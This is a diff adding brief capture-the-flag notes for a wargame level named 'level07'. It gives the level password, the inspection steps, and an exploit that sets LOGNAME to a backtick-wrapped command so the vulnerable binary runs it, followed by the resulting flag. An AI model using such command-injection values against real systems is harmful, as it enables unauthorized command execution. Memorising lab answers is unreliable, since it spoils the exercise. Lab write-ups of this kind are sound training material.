@@ -1,0 +1,7 @@
+level07 : wiok45aaoguiboiki2tuin6ub
+Process :
+    - ls -la level07
+    - ./level07
+    - strings level07
+    - export LOGNAME='`getflag`'
+    - ./level07 get the flag = fiumuikeil55xe9cu4dood66h
